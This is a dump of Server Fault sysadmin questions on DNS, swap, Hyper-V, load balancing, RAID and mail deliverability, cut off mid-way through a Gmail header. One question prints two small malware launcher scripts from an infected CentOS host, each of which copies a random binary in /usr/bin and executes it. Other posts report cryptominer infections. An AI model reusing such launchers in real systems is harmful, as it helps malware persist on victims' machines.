<p>I tried to increase the swappiness from 60 to 100 but it didn't change anything.</p>

<p>I'm out of ideas, am I missing something?</p>
","<mysql><debian><swap>","2017-02-16 04:56:49"
"833002","How can I query all DNS entries known by my DNS server?","<p>My office relies on a lot of custom DNS entries to store useful information, but the site listing isn't well documented. </p>

<p>I'd like to search the network and see what's available that I may not know about. I know that all of our custom entries have a specific .pvt TLD, so I can filter for what I'm looking for, but I don't know how to get a raw dump from my DNS server.</p>

<p>I am not a network administrator so I don't actually have access to the DNS server. I'd like to know if there is some what that I can query the server and basically ask ""what DNS records do you know?""</p>

<p>I'm not sure if this is a thing that exists or not.</p>
","<domain-name-system>","2017-02-16 18:24:26"
"955871","Can my server handle 12,000 database requests per-minute?","<p>First of all, Apologies if this is a silly question. I've never really had to manage servers and databases, on a ""large-scale"", that is. </p>

<p>ANYWAY, on to the question. I am trying to figure out if our current server can handle 12,000 database requests per minute. (once again, I don't know if this a lot. I assume it's mid-range). I am estimating that 2/3 of the 12,000 requests will be simple <code>SELECT</code> queries from super small tables. No more than 20,000 rows in a table-  I've made a point to prune them on a regular basis. LAMP Stack.</p>

<p><strong>Below are the server hardware and software specs:</strong></p>

<p>Processors- Intel Haswell 2095.050 MHz</p>

<p>Memory -  7.45gb useable </p>

<p>Storage - 80GB SSD</p>

<p>OS- Ubuntu, CentOS 7</p>

<p><strong>DB</strong></p>

<p>MySQL</p>

<p>V5.7.25</p>

<p>PHP - 7.2.7</p>

<p>The database is stored on the same server as where files are being served.</p>

<p>If this server is capable of this, how much further can the server be pushed? </p>

<p>Thank you in advance (And sorry if this seems to be a dumb question)</p>
","<mysql><php><performance><database>","2019-02-26 21:33:55"
"1021700","Associate static IP address to a user friendly name","<p>I imagine this must be a basic question for any system administrator, but I am failing to find a simple step-by-step guide.</p>
<p>I am managing a web server with a static IP address in the standard form 137.xxx.xxx.xx and I would like to associate it to a &quot;user friendly&quot; name, such as homosapiens.org
What is the suggested procedure to follow? I think I will have to rent a domain name first with a registrar, but then I am not sure how to link the name to the IP. And given the vast noise on the internet, I am also looking for a philosophical explanation on how the process works.</p>
","<domain-name-system><domain><domain-registrar><domain-registration>","2020-06-16 13:22:05"
"1021751","Changing router WAN IP Address","<p>Hi I don't really understand how WAN IPs work, can someone explain how I can change my address to a static one. How can I know if the address I want is taken? How can I see what addresses are available?</p>
","<networking><ip><router><wide-area-network><static-ip>","2020-06-16 17:04:52"
"956132","Monero hack survives reboot in linux","<p>We recently had some servers hacked (Ubuntu, various flavours) which installed a Monero miner that starts a process called watchbog. We scrubbed them clean and blocked access to where they can update themselves from but on reboot the servers start to rebuild the miners installation (and fails)</p>

<p>It is creating a directory <code>/tmp/systemd-private-d3883bec41f94ab0b3d927e3022873b1-systemd-timesyncd.service-jVvrE0</code> and some subdirectories and then stops. The random bits are random each time</p>

<p>What I want to know is what is rebuilding this on boot. There does not seem to be anything obvious in the logs or the various boot scripts. Where else can I look?</p>
","<linux><malware>","2019-02-28 10:30:14"
"1022027","What monitoring system should I use for offline network","<p>I'm part of a sysadmin\DevOps team for for an application. Currently today we have about 25 - 40 vms running as different parts of the application in micro services on the
openshift container platform, using also Jenkins, Nexus3, some relational and mongo DB's.</p>
<p>I'm looking into monitoring the servers and different linux services on them. First I found out about monit and part from it's single server monitoring ability using the web GUI it was pretty fast and simple to use.</p>
<p>Yet again I can't have that many different GUIs to look at to understand the network status. More recently I've encountered Nagios core and XI and currently in the process of deploying the (Nagios core) nrpe_3.2.1 agents on the different nodes in the network, yet because of dependency issues I'm leaning toward Nagios XI for ease of use and so it would &quot;just work&quot;. I specifically want service monitoring and event handlers is case of service crash or status change to keep all running without requiring my attention. If I can get a validation on the existing or recommendation for something better (as well as hopefully free and open source) it'd be much appreciated. Thnx, Noam.</p>
","<linux><monitoring><nagios><service><containers>","2020-06-18 14:00:13"
"1022030","When to use routers and when to use layer 3 switches","<p>If you were to connect two buildings on the same site via fiber, what is best to use - routers or layer 3 switches? The layer two switches in each building have VLAN's, so these will either connect to a router or layer 3 switch, and then the router or layer 3 switch will connect to the other buildings router or layer 3 switch.</p>
<p>Or the other option is instead of having routers and layer 3 switches in each building, the main layer 2 switch in each building connects to one another and these both connect to a router or layer 3 switch in the main building.</p>
<p>I'm aware layer 3 switches are in a sense routers, and are typically used for VLAN's, but router on a stick could also tackle that problem.</p>
","<routing><router><switch><vlan>","2020-06-18 14:49:22"
"1022061","How to block/reject all incoming packets from Asia?","<p>I have my own VPS and I want to block/reject all incoming packets from Asia. Is it possible to do it? My server is on Ubuntu.</p>
","<firewall><vps>","2020-06-18 18:52:01"
"833532","FreeBSD CARP doesn't work in VirtualBox with bridged adapter","<p>I have two identical VirtualBox machines running FreeBSD. Their networking is set up using ""Bridged Adapter"" option. I've followed <a href=""https://www.freebsd.org/doc/handbook/carp.html"" rel=""nofollow noreferrer"">FreeBSD Handbook</a> instructions step-to-step, but I still not able to access CARP'ed IP from host system.</p>

<p>What's wrong and how to fix that?</p>
","<virtualization><virtual-machines><freebsd><carp>","2017-02-19 20:24:54"
"1022266","Malicious files generating in CentOS 7 directory /usr/bin","<p>I installed a CentOS 7 at my Virtual Machine,</p>
<p>As i have installed the antivirus on the machine i found some files in /usr/bin which coming as Malicious content, i backup them and again they generated with another names, and names are randoms. Can someone guide me what kind of files are, is it really any Malicious Script which generating files. below are the files for the reference.</p>
<pre><code>rwxr-xr-x. 1 root root    625889 Jun 14 17:58 zqoppdtajj_bkp_ali  #i marked them backup
-rwxr-xr-x. 1 root root       156 Jun 14 17:58 saxquzl.sh_bkp_ali #i marked them backup
-rwxr-xr-x. 1 root root       158 Jun 14 20:19 nntbxqpwp.sh_blk_script #i marked them backup
-rwxr-xr-x. 1 root root    625878 Jun 14 20:19 rpsdbuuyef_bkp_ali #i marked them backup
-rwxr-xr-x. 1 root root       161 Jun 20 13:46 plhurveidhxc.sh_bkp_ali #i marked them backup
-rwxr-xr-x. 1 root root       160 Jun 20 13:47 ezkxscupeqn.sh_bk_ali #i marked them backup

-rwxr-xr-x. 1 root root    562340 Jun 20 13:49 uhrxms
-rwxr-xr-x. 1 root root       155 Jun 20 13:49 smxrhu.sh
-rwxr-xr-x. 1 root root    562340 Jun 20 13:49 smxrhu
-rwxr-xr-x. 1 root root    559794 Jun 20 13:50 zkjqbal
-rwxr-xr-x. 1 root root    559794 Jun 20 13:50 labqjkz
-rwxr-xr-x. 1 root root       156 Jun 20 13:50 labqjkz.sh
</code></pre>
<p>inside the smxrhu.sh</p>
<pre><code>#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
cp &quot;/usr/bin/smxrhu&quot; &quot;/usr/bin/mrpjpymvkc&quot;
&quot;/usr/bin/mrpjpymvkc&quot;
</code></pre>
<p>Inside the labqjkz.sh</p>
<pre><code>#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
cp &quot;/usr/bin/labqjkz&quot; &quot;/usr/bin/ivsuvtlkzx&quot;
&quot;/usr/bin/ivsuvtlkzx&quot;
</code></pre>
<p>Thanks in advance.</p>
","<linux><centos7><malicious>","2020-06-20 11:20:46"
"904473","UTP cable issue","<p>I had LAN cables installed in my home with sockets in the walls in the house and terminating in the garage with RJ45 connectors (router sits there).</p>

<p>I have been using one such connection for over 5 years but a couple of months ago I started having intermittent problems. I thought it was an issue with my desktop, but eventually it stopped working completely. I finally came to the conclusion that it was the cable and bought a cheap cable tester and established that 2 wires were not working (3 and 7).</p>

<p>I've hardly ever touched these cables, so is it more likely that the issue is with the cable or with the connectors? It seems it will be very difficult to get a new cable to the same location. What could be the cause of such an issue?</p>
","<utp>","2018-03-25 10:51:07"
"1022376","Setting up a TCP-SNI proxy that dynamically forwards SSL traffic to any hostname that the SNI might contain","<p>I'm firstly gonna summerize my goal:</p>
<p>I'll setup a DNS server and configure my smart tv to use it. I'll set the DNS server up so that requests to specific DNS zones will not actually be resolved, rather the DNS server will return the IP of my proxy server. The proxy server needs to accept any HTTPS request, inspect the SNI, and forward the request to the corresponding host. I cannot statically configure the hosts to which the proxy shall pass the incoming requests, as those hostnames are being &quot;randomly&quot; (= outside of my control) generated in a specific DNS zone.</p>
<p>So far I've looked into nginx's ngx_stream_ssl_preread_module, as well as into HProxy. So far, I have not found a way to make them proxy pass the traffic to $requesthostname, it seems like you always need to specify backends to which you pass the traffic.</p>
<p>While inspecting HTTPS traffic on my local machine using mitmproxy, I realized that it behaves as I desire, in that it forwards all HTTPS requests to the corresponding hostnames. However, as I cannot install mitmproxy's CA certificate on my smart tv, I cannot use it for this purpose.</p>
<p>Does anybody know a proxy software that serves my purpose, or a way to configure one of the proxyservers I mentioned in such a way that it behaves in such a manner?</p>
<p>Help is greatly appreciated, thanks in advance</p>
","<proxy><reverse-proxy><https>","2020-06-21 14:51:42"
"904589","Windows server 2012/6 Limit copying size","<p>we need to add a limit for pasting to SMB Folder from Windows Server 2012. Is any way, users within MS Server to have quota/limiter once pasting files to SMB share? The share is mounted at Windows Server.</p>

<p>Thank you</p>
","<windows>","2018-03-26 10:39:42"
"956544","How to understand this output of ip route list table 255","<pre><code>broadcast 100.125.71.152 dev rmnet_data1  proto kernel  scope link  src 100.125.71.153 
local 100.125.71.153 dev rmnet_data1  proto kernel  scope host  src 100.125.71.153 
broadcast 100.125.71.155 dev rmnet_data1  proto kernel  scope link  src 100.125.71.153 
broadcast 127.0.0.0 dev lo  proto kernel  scope link  src 127.0.0.1 
local 127.0.0.0/8 dev lo  proto kernel  scope host  src 127.0.0.1 
local 127.0.0.1 dev lo  proto kernel  scope host  src 127.0.0.1 
broadcast 127.255.255.255 dev lo  proto kernel  scope link  src 127.0.0.1

</code></pre>

<p>What's means of <code>broadcast</code> <code>local</code> ? Why is not show the netmask? Look there is show gateway ipaddress.</p>
","<linux><ip><route><iproute2>","2019-03-03 17:34:13"
"904691","Autostart/restart program simply with daemontools in debian 9","<p>For example make vlc start and play a video full screen on boot.
After working this out here it is:</p>
","<debian><daemon><debian-stretch><daemontools>","2018-03-26 22:17:27"
"1022580","How does a PC determine which network adapter to use when given an IP/DNS to connect to?","<p>I have so many network adapters on my PC. If I type for example &quot;Ping 192.168.191.128&quot;, how does my PC now which network adapter to use?</p>
<p>What if it's a DNS name like &quot;mylocal.ddd.com&quot;, how does my PC now which adapter configured DNS server to look for?</p>
","<networking><tcpip>","2020-06-23 10:35:58"
"834101","Creating uptime monitor - Identifying network bottleneck","<p>So I'm working on a website uptime monitor that should check thousands of websites per minute by doing a simple http call to them and checking the received status code.</p>

<p>I've tested it using multiple processes of a node.js implementation to ensure that the bottleneck is not a programming or processing one.</p>

<p>Anyways I've hit a wall. The maximum number of sites I'm able to check is roughly 2000 per minute. This number doesn't change if I run 1 instance or 10 instances of the code.</p>

<p>If I run multiple processes, the throughput of each process reduces so that the total output is still 2000 sites checked per minute.</p>

<p>The actualy network bandwidth doesn't seem to be too high. I mean 2000 websites would mean roughly 1 mb of data (and that's being generous). So it's probably an issue somewhere else and i'm trying to pinpoint that.</p>

<p>Tested on digital ocean.</p>

<p>Thanks in advance.</p>
","<networking><http><tcp><ping><node.js>","2017-02-22 07:08:13"
"1022710","SSH Local Forwarding","<p>I have an ubuntu server that is currently connected to my iMac via Ethernet bridge with ip address <code>192.168.2.2</code>. iMac is sharing the internet with ubuntu server with this.</p>
<p>The iMac's IP address is <code>192.168.0.105</code> in the LAN network to the main router/modem. And <code>192.168.2.1</code> on the Ethernet bridge with ubuntu server.</p>
<p>The ubuntu server is allowing apache to be accessed to all via port <code>:80</code>.</p>
<p>So in iMac, I ran <code>sudo ssh -L 80:0.0.0.0:80 ubuntu@192.168.2.2</code> and I can access the apache server directly in my iMac browser using <code>localhost</code>.</p>
<p>Question is, if I have another computer in the LAN that I would like it to <strong>access the apache ubuntu server via iMac</strong> ip address <code>192.168.1.105</code>. How would that work?</p>
<p>I have tried accessing it with <code>192.168.0.105</code> in the computer browser, but doesn't seem to work.
And it's not possible to access it directly with <code>192.168.2.2</code> since that's the ip address over the Ethernet bridge connection to iMac.</p>
","<mac-osx><ssh-tunnel>","2020-06-24 08:48:03"
"904972","Teaming a drive in multiple RAID groups","<p>I've setup a home RAID for a friend in the past from a heap of old and new 2T and 3T drives. seems very much like what BeyondRAID does. I made a 7 member RAID5 group of the 2T volumes and the first 2TiB of the 3T drives, and a second 5 member group of the upper 1T of the 3T drives, then added those two PVs to an LVM vg and voila, a pretty good maximization of the disk areas, only 3TiB lost on parity.</p>

<p>Now I'm building an array at home. I had 4 disks of 4 TiB (12 TiB usable under RAID5), I then replaced two with the first 4TiB of two 8TiB drives, adding one back as the member of a 3-disk array with the top 4TiB of the two 8T drives and leaving one out of the chasis for emergency rescues. same deal - add the new 8TiB PV to the LVM and I should be good, right?</p>

<p>Well, I have to wonder at this point. I'f I'm losing 8TiB to the parity anyway, does it make more sense to have those two RAID5 groups (with the two 8TB disks members in both).</p>

<p>Other than really long rebuilds if one of the bigger drives fails, this gives me some flexibility I could not have otherwise, like replacing 4TiB drives that fail in the future with 8TB drives. but am I missing anything? It's a very low traffic home media server, made of WD-red because really performance is far from being the bottleneck. Am I missing some basic caveat?</p>
","<software-raid><raid5><md><media-server>","2018-03-28 11:12:15"
"904991","Should I have seperate docker compose files for each server?","<p>So I'm evaluating docker for our current system and I just have a couple of questions. Note I'm not an expert, I just want some answers here to try to get a clearer impression of whether Docker works for our organisation.</p>

<p>So we want to deploy a .NET Core app with a SQL database. We have some special requirements about our infrastructure which I won't go into - but basically we have no idea what OS it'll be running and a lot of red tape in gaining access to the environment.</p>

<p>So that is part of the reason I want to deploy with Docker. Just have as much as we can fully controlled from our end and just make sure we get Docker installed on the prod server. My dream goal would be for each release, I can just give the infrastructure company a docker image, and they just run a container of it in production.</p>

<p>So my questions </p>

<p>1) We'll likely have different servers for the app and for the database. Is it a good idea then to develop seperate docker compose files for them and just have seperate deployments?</p>

<p>2) Can Docker containers access external resources outside of the container? So like for example, if there is an existing SMTP server or even some files sitting in a directory on the server, would something inside a docker container be able to access that? If so, what kind of resources can they access? Does it just need a URL or port number?</p>

<p>3) Is there any sort of way to config file for a docker image? I was thinking each image for each environment would all be the same and each environment (eg. dev, prod) would have its own config file</p>
","<docker><docker-compose>","2018-03-28 13:12:15"
"834272","SQL on Server Core pitfalls","<p>We are going to try new SQL Server 2016 and we're thinking to install it on Windows Server Core. I know there are some benefits from going this way. From what I've heard, this setup is more secure and it is much easier to manage. But are there any risks or maybe limitations for the running SQL on Server Core OS? Also can you recommend a good guide on the installing procedure? Thank you for your help.</p>
","<windows-server-core><sql-server-2016>","2017-02-22 19:52:21"
"905008","Permissions Issue on Centos","<p>Hi I'm trying to deply a webapp to my server who currently runs Centos and I have the issue that I can not write to files inside the public app dir. My directory structure is as follows, there you can see permissions on each directory. The list runs from the index.php file to the root directory.</p>

<pre><code>-rwxrwxr-x. 1 myuser apache 102 Mar 28 08:08 /var/www/mypage/public/index.php
drwxrwxrwx. 2 myuser apache 4096 Mar 28 07:39 /var/www/mypage/public
drwxrwxr-x. 3 myuser apache 4096 Mar 28 07:39 /var/www/mypage
drwxr-xr-x. 9 myuser apache 4096 Mar 28 07:38 /var/www
drwxr-xr-x. 20 myuser apache 4096 Nov  6 09:16 /var
</code></pre>

<p>The server throws an error that says that the server has no permissions to  write to a file inside the <strong>public</strong> directory.</p>

<p>The server runs as apache and the user <strong>myuser</strong> is on the apache group.</p>

<p>So, what can be happening? I have other projects inside the same directory and they have the same folder structure and permission but with no permissions error.</p>
","<linux><httpd><apache2>","2018-03-28 14:26:16"
"834288","Web Server and VPN on same machine","<p>I have a domain, lets call it <code>test.com</code> thats pointing to IP <code>260.0.0.10</code>, this is my home external ip.</p>

<p>On this IP I have an webserver (Wildfly) and an VPN client (AirVPN). My IP on the VPN client is <code>300.0.0.10</code>.</p>

<p>Wildfly is behaving as I want, It answers to the calls of <code>260.0.0.10</code>.</p>

<p>If I look for my external IP in Google it is <code>300.0.0.10</code>, how I expect it to be, everything fine until now. </p>

<p><strong>1.</strong> My other programs do use the VPN but, will this affect the webserver?</p>

<p><strong>2.</strong> As far as I understand, this is like having 2 external IP adresses, except that <code>260.0.0.10</code> goes through my ISP and allows port forwarding while <code>300.0.0.10</code> still goes through my ISP but does not allow port forwarding (nor am I interested in it since vpns would be useless lol), is this correct? </p>

<p><strong>3.</strong> Is there any chance for the trafic on <code>300.0.0.10</code> to know that <code>260.0.0.10</code> even exists? I mean, while using the VPN to browse the web can it be possible for lets say Chrome to find a relationship between <code>300.0.0.10</code> and <code>260.0.0.10</code>?</p>

<p><strong>4.</strong> Would using VPN and WebServer at the same time affect web ranking / indexing? </p>
","<domain-name-system><vpn><web-server>","2017-02-22 21:09:34"
"1022835","Patch panel to patch panel","<p>I’m in the process of building a cottage/office in our backyard and will be running CAT6 cable there for connectivity. I prefer to keep my cable modem and router in the house so I was thinking of having a patch panel in the house that the long run will be connected to and then terminate in the new cottage with another patch panel (from there it will go to a switch). So it will basically look like:</p>
<pre><code>Cable Modem —&gt; Router —&gt; Patch Panel —&gt; (75 ft run) —&gt; Patch Panel —&gt; Switch
</code></pre>
<p>Is it okay to go directly from patch panel to patch panel? I’m not a networking guy so I’m not sure if this is to spec or not. Thanks!</p>
","<networking>","2020-06-25 03:09:28"
"834334","df -h show system full even after clearing bloated log folder","<p>I had my php_errors.log file fill up the system, I deleted the error logs, but when I type</p>

<pre><code>df -h www/folder_name
Filesystem      Size  Used Avail Use% Mounted on
bindfs          7.8G  7.4G  379M  96% /www/folder_name
</code></pre>

<p>How do I clear it up</p>
","<linux><memory-usage><df>","2017-02-23 03:03:10"
"905192","Windows Server 180 days evaluation period for individuals","<p>Can i as individual get access to 180 evaluation period for windows server. Problem is it says it requires name of a company and company phone number</p>
","<windows-server-2016>","2018-03-29 13:16:13"
"834343","Opening winscp in the same folder as opened putty session","<p>Say I am in /home/user/folder1/folder2/ in putty i want to open winscp in that folder.I can do the other way around; Open putty in current folder from winscp.Or atleast is there any other software that manages both ssh and sftp both and can provide me with this functionality(open ssh in current folder when in sftp session, open ssh in current folder when in ssh session).</p>
","<linux><putty><winscp>","2017-02-23 03:41:04"
"1022904","One process in my server using 100% cpu","<p>Please check below</p>
<pre><code>  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
 2561 redis     20   0 2761160   2.3g   1028 S 200.0 30.0  58:33.49 sysupdate
 2576 redis     30  10  577576  61120    540 S 194.7  0.8  54:20.02 networkservice
</code></pre>
<p>I have no idea where they came from. How can I manage them</p>
","<centos><redis>","2020-06-25 12:32:29"
"1022922","PLESK in Windows Server 2019 Standard - local user limitation","<p>I recently installed PLESK in Windows Server 2019 Essentials, without enabling or joining in Active Directory. There are 20 domains that I support for IIS, FTP and DNS services. Regarding the e-mail service, I use an external software. Unfortunately, this license has a limitation of 25 local user accounts and PLESK has created 68 local account until now.
I contact with PLESK and they told me to upgrade to Windows Server 2019 Standard edition (WS2019S).</p>
<p>Looking in the internet I didn't find answers for the questions below.</p>
<ol>
<li>How many local users does the WS2019S edition supports?</li>
<li>There is something called user or device CAL and RDS CAL. Do I need user CAL in order the PLESK to run or just the license for WS2019S is fine for my scenario?</li>
<li>Looking in ebay for WS2019S license I found some sellers who have very low price and I wonder if it is reliable?</li>
</ol>
","<windows-server-2019><plesk>","2020-06-25 15:06:10"
"905246","What happens if I overload a load balancer? Can I have two load balancers, and how would I set this up?","<p>I have a question about scalability. Here's what I know so far:</p>

<p><em>If I have an application that exceeds the provision of a single machine, it's possible to scale horizontally by adding additional machines. A load balancer would distribute traffic among those machines.</em></p>

<p>However, what happens when the load balancer gets overloaded? Could anyone provide an explanation about how I could set up a second load balancer using NGINX?</p>
","<nginx><load-balancing>","2018-03-29 18:46:15"
"1022949","Hyper-V: VMs are not using all CPU power available to the server?","<p>I have a relatively powerful dual-xeon (12 cores) server
<a href=""https://i.sstatic.net/smfcP.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/smfcP.png"" alt=""enter image description here"" /></a>
running <code>MS Windows Server 2016</code> with <code>Hyper-V</code> installed. I created a bunch of VMs - and none of them are really resource-demanding - except one VM I want to use for processing security cameras' feed. So I gave that VM 8 vCPUs in settings:
<a href=""https://i.sstatic.net/djIxI.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/djIxI.png"" alt=""enter image description here"" /></a></p>
<p>but even though CPU usages goes to 70% in that VM, the host has almost zero CPU usage displayed. I thought &quot;perhaps, Windows does not report CPU usage from VMs in the host&quot; - even though that does not really make sense to me - but <em><strong>the problem is that VM lacks performance</strong></em>. It misses frames, etc. And for 3 cameras I have, I'm sure underlying host server has more than enough computing power.
<a href=""https://i.sstatic.net/6HXm5.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/6HXm5.png"" alt=""enter image description here"" /></a></p>
<p>So the question is - am I doing something wrong? How do I tell a specific VM &quot;take as much CPU as needed from the host&quot;?</p>
","<hyper-v><windows-server-2016><cpu-usage>","2020-06-25 19:02:33"
"834422","Cluster office workstations when not in use?","<p>We've got around ~15 relatively decent Windows machines in the office and I'm wondering if it's possible to set up a system that clusters them as a single virtual machine when they're not in use during office hours.</p>

<p>We run a lot of CPU intensive numerical simulations and rather than buying standalone simulation machines, it'd be nice to leverage the unused office workstations at night/over the weekend (ideally as a single VM with many CPUs).</p>

<p>If this is possible, where would one start looking to go about this? Are there any common issues/considerations I should be aware of?</p>

<p>Thanks.</p>
","<virtualization><virtual-machines><cluster><windows-cluster>","2017-02-23 11:22:52"
"1023026","Backup a vmware machine daily and eventually restore it in hyper-v","<p>I have a vmware ESXI with 4 vm inside, in the same facility I have a Windows 2019 standard server big enough to host the vm and the backup. Can I have a daily backup from vmware esxi inside the windows server, and eventually restore it in hyper-v inside that server? If I can, how can I do it? What Tools do I need?</p>
","<vmware-esxi><hyper-v><windows-server-2019>","2020-06-26 12:46:10"
"905349","Why user a server cage nut?","<p>I got a server rack and it comes with square holes. I also got some server cage nuts &amp; bolts.</p>

<p>Why do you use the nuts when the server can be held in place with just the screws sitting inside the squares?</p>
","<dell-poweredge>","2018-03-30 14:21:25"
"1023083","Dealing with an ATA error","<p>my Xubuntu 16.04. produces a non-stop ATA error message. Here is the output of <code>dmesg</code></p>
<pre><code>[ 4547.943159] ata7: hard resetting link
[ 4548.657810] ata7: SATA link down (SStatus 0 SControl 300)
[ 4548.657824] ata7: EH complete
[ 4548.757449] ata7: exception Emask 0x10 SAct 0x0 SErr 0x4000000 action 0xe frozen
[ 4548.757455] ata7: irq_stat 0x00000040, connection status changed
[ 4548.757459] ata7: SError: { DevExch }
[ 4548.757467] ata7: hard resetting link
[ 4549.469969] ata7: SATA link down (SStatus 0 SControl 300)
[ 4549.469983] ata7: EH complete
[ 4550.363622] ata7: exception Emask 0x10 SAct 0x0 SErr 0x4000000 action 0xe frozen
[ 4550.363628] ata7: irq_stat 0x00000040, connection status changed
[ 4550.363632] ata7: SError: { DevExch }
[ 4550.363642] ata7: hard resetting link
</code></pre>
<p>This error runs continuously.</p>
<h2>Information about my system:</h2>
<p>I have two hard disks and a DVD</p>
<pre><code># lsscsi
[0:0:0:0]    disk    ATA      MAXTOR STM325082 E     /dev/sda 
[0:0:1:0]    cd/dvd  TSSTcorp CDDVDW SH-S223B  SB02  /dev/sr0 
[1:0:0:0]    disk    ATA      SAMSUNG HD320KJ  0-10  /dev/sdb 
</code></pre>
<p>And the ata ports for the hard disks are following</p>
<pre><code>/sys/bus/pci/devices/0000:00:1f.2/ata1/host0/target0:0:0/0:0:0:0/block/sda
/sys/bus/pci/devices/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb
</code></pre>
<p>A complete list of ata ports is</p>
<pre><code> # ls -l /sys/class/ata_port
 ata1 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata1/ata_port/ata1
 ata2 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/ata_port/ata2
 ata3 -&gt; ../../devices/pci0000:00/0000:00:1f.5/ata3/ata_port/ata3
 ata4 -&gt; ../../devices/pci0000:00/0000:00:1f.5/ata4/ata_port/ata4
 ata5 -&gt; ../../devices/pci0000:00/0000:00:1c.6/0000:03:00.1/ata5/ata_port/ata5
 ata6 -&gt; ../../devices/pci0000:00/0000:00:1c.6/0000:03:00.1/ata6/ata_port/ata6
 ata7 -&gt; ../../devices/pci0000:00/0000:00:1c.6/0000:03:00.0/ata7/ata_port/ata7
</code></pre>
<p>And the devices</p>
<pre><code># ls -l /sys/dev/block
11:0 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata1/host0/target0:0:1/0:0:1:0/block/sr0
7:0 -&gt; ../../devices/virtual/block/loop0
7:1 -&gt; ../../devices/virtual/block/loop1
7:2 -&gt; ../../devices/virtual/block/loop2
7:3 -&gt; ../../devices/virtual/block/loop3
7:4 -&gt; ../../devices/virtual/block/loop4
7:5 -&gt; ../../devices/virtual/block/loop5
7:6 -&gt; ../../devices/virtual/block/loop6
7:7 -&gt; ../../devices/virtual/block/loop7
8:0 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata1/host0/target0:0:0/0:0:0:0/block/sda
8:1 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1
8:16 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb
8:17 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb/sdb1
8:18 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb/sdb2
8:19 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb/sdb3
8:20 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb/sdb4
8:21 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb/sdb5
8:22 -&gt; ../../devices/pci0000:00/0000:00:1f.2/ata2/host1/target1:0:0/1:0:0:0/block/sdb/sdb6
</code></pre>
<p>Finally the partitions:</p>
<pre><code># lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
loop1    7:1    0    55M  1 loop /snap/core18/1754
sdb      8:16   0 298.1G  0 disk 
├─sdb4   8:20   0     1K  0 part 
├─sdb2   8:18   0  46.6G  0 part /
├─sdb5   8:21   0 124.6G  0 part /home
├─sdb3   8:19   0   7.9G  0 part [SWAP]
├─sdb1   8:17   0 599.9M  0 part /boot
└─sdb6   8:22   0 118.2G  0 part 
loop4    7:4    0   291M  1 loop /snap/vlc/1620
sr0     11:0    1  1024M  0 rom  
loop2    7:2    0    97M  1 loop /snap/core/9289
loop0    7:0    0    55M  1 loop /snap/core18/1705
sda      8:0    0 232.9G  0 disk 
└─sda1   8:1    0   197G  0 part 
loop5    7:5    0  96.5M  1 loop /snap/core/9436
loop3    7:3    0 290.4M  1 loop /snap/vlc/1700
</code></pre>
<h2>Question:</h2>
<p>How can I solve this error?</p>
<p>Any possible help that helps to solve it is also appreciated, for example, what is this ata7 problematic port? From all the data that I have gathered it seems it does not correspond to any physical disk nor any partition.</p>
","<linux><ubuntu><hard-drive><partition><sata>","2020-06-26 19:15:02"
"834550","How Uninstall pip and python","<p>I wanted to install version 3 of python and pip but instead issued</p>

<pre><code>sudo apt-get install python-pip python-dev
</code></pre>

<p>how do I uninstall python and pip, I tried sudo apt-get uninstall but did not work, what is the correct command?</p>
","<linux><ubuntu><python><ubuntu-16.04><pip>","2017-02-23 19:27:33"
"905483","How to fix mysql has gone away, high writeiops, switch to postgres?","<p>We have a Django site (Django 1.4) running under NGINX and uwsgi. The site uses MYSQL 5.6.39 which runs on a separate AWS RDS instance. It runs fine for about a week but then suddenly we get the dreaded MYSQL 2006 error - MYSQL server has gone away. We have also noticed that there seems to be a sudden large increase in write IOPS around the time that this occurs.</p>

<p>After searching online, the following suggestions have been made:</p>

<ul>
<li>increase max_allowed_packet to something like 128M</li>
<li>increase wait_timeout and interactive_timeout to 86400</li>
<li>use lazy=1 in our uwsgi config file on our webapp server</li>
</ul>

<p>We are in the process of trying these, but this issue is hard to debug since we have to wait a week of running to replicate it. So:</p>

<ol>
<li>Are there any other parameters we should set to make this issue go away?</li>
<li>Is there anything we can do in our Django app to make this issue go away? For example should we close the DB connection at the start of every view?</li>
<li>Would this whole problem just go away if we switched to a different DB like Postgres?</li>
</ol>
","<mysql><postgresql><django><uwsgi>","2018-04-01 04:22:00"
"905492","Why is my email being marked SPAM by gmail?","<p>I'm running my own mail server in a VPS using iRedMail. I followed all the steps to get a good mail record like setting SPF, DKIM and SMARC values. When I try to send to my gmail account 'openplantsolutions@gmail.com', Gmail accounts the email as a spam. Below is the original message taken from gmail. According to Gmail:</p>

<ul>
<li>SPF: PASS with IP 139.99.169.193</li>
<li>DKIM:    'PASS' with domain open-plant.com </li>
<li>DMARC:   'PASS'</li>
</ul>

<p>Any help? Thanks</p>

<blockquote>
  <p>Delivered-To: openplantsolutions@gmail.com Received: by 10.46.57.13
  with SMTP id g13csp1434134lja;
          Sun, 1 Apr 2018 01:41:09 -0700 (PDT) X-Google-Smtp-Source: AIpwx48UCkYJYT2wHIlZdhPxCRKc/ys+AUGxE/RVSahjhu/qjye4JPUzlkyNJRPgxobdwiDTS1Fi
  X-Received: by 10.98.102.131 with SMTP id
  s3mr4089260pfj.89.1522572068895;
